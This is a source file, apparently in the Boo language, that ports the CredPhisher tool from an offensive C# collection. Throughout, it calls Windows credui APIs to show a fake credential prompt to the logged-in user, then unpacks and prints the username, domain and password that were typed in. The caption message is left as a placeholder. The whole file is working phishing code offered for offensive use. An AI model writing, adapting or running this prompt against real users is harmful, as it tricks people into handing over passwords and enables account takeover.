/*
Ported from @matterpreter's CredPhisher C# tool (https://github.com/matterpreter/OffensiveCSharp)
*/

import System
import System.Net
import System.Runtime.InteropServices
import System.Text

public class CredPhisher:

    [DllImport('ole32.dll')]
    public static def CoTaskMemFree(ptr as IntPtr):
        pass

    [StructLayout(LayoutKind.Sequential, CharSet: CharSet.Auto)]
    private struct CREDUI_INFO:
        public cbSize as int
        public hwndParent as IntPtr
        public pszMessageText as string
        public pszCaptionText as string
        public hbmBanner as IntPtr

    [DllImport('credui.dll', CharSet: CharSet.Auto)]
    private static def CredUnPackAuthenticationBuffer(dwFlags as int, pAuthBuffer as IntPtr, cbAuthBuffer as uint, pszUserName as StringBuilder, ref pcchMaxUserName as int, pszDomainName as StringBuilder, ref pcchMaxDomainame as int, pszPassword as StringBuilder, ref pcchMaxPassword as int) as bool:
        pass

    [DllImport('credui.dll', CharSet: CharSet.Auto)]
    private static def CredUIPromptForWindowsCredentials(ref notUsedHere as CREDUI_INFO, authError as int, ref authPackage as uint, InAuthBuffer as IntPtr, InAuthBufferSize as uint, ref refOutAuthBuffer as IntPtr, ref refOutAuthBufferSize as uint, ref fSave as bool, flags as int) as int:
        pass

    public static def Collector(message as string, ref networkCredential as NetworkCredential):
        credui = CREDUI_INFO()
        //This block collects the current username and prompts them. This is easily modifiable.
        username as string = System.Security.Principal.WindowsIdentity.GetCurrent().Name
        credui.pszCaptionText = message
        credui.pszMessageText = ('Please enter the credentials for ' + username)
        credui.cbSize = Marshal.SizeOf(credui)
        authPackage as uint = 0
        outCredBuffer = IntPtr()
        outCredSize as uint
        save = false
        result as int = CredUIPromptForWindowsCredentials(credui, 0, authPackage, IntPtr.Zero, 0, outCredBuffer, outCredSize, save, 1)

        usernameBuf as StringBuilder = StringBuilder(256)
        passwordBuf as StringBuilder = StringBuilder(256)
        domainBuf as StringBuilder = StringBuilder(128)

        maxUserName = 256
        maxDomain = 256
        maxPassword = 128
        if result == 0:
            if CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, maxUserName, domainBuf, maxDomain, passwordBuf, maxPassword):
                CoTaskMemFree(outCredBuffer)
                networkCredential = NetworkCredential(
                    UserName: usernameBuf.ToString(),
                    Password: passwordBuf.ToString(),
                    Domain: domainBuf.ToString()
                )
                return
        networkCredential = null

    public static def Main(message as string):
        try:
            networkCredential as NetworkCredential
            Collector(message, networkCredential)
            print "[+] Collected credentials:"
            if networkCredential.Domain.Length > 0:
                print "Username: $(networkCredential.Domain)\\$(networkCredential.UserName)"
            else:
                print "Username: $(networkCredential.UserName)"

            print "Password: $(networkCredential.Password)"
        except converterGeneratedName1 as NullReferenceException:
            Console.WriteLine('[-] User exited prompt')
        except converterGeneratedName2 as Exception:
            Console.WriteLine('[-] Looks like something went wrong...')

public static def Main():
    message = "MESSAGE_GOES_HERE"
    CredPhisher.Main(message)
